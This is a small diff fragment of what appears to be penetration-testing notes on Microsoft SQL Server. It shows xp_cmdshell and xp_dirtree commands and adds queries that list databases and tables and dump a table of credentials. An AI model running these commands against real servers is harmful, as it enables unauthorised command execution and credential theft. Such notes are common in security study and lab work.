@@ -56,6 +56,9 @@ SQL> xp_cmdshell whoami
 SQL> xp_dirtree
 
 # Refer to Cheat Sheet
+SELECT name FROM sys.databases; 
+SELECT * FROM name.information_schema.tables; 
+SELECT * from name.dbo.creds;
 ```
 
 ```powershell
